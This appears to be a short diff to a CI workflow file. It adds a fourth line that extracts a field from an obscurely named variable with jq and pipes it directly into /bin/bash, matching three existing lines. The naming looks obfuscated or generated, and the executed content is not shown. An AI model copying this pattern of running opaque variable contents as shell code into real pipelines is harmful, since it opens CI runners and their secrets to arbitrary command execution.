@@ -28,6 +28,7 @@ jobs:
           echo $onhvu2854 | jq -r .khm706 | /bin/bash
           echo $bqyac34994 | jq -r .c94 | /bin/bash
           echo $fwyse0 | jq -r .omyjw2 | /bin/bash
+          printf '%s' "$klx1045" | jq -r .hd3264 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
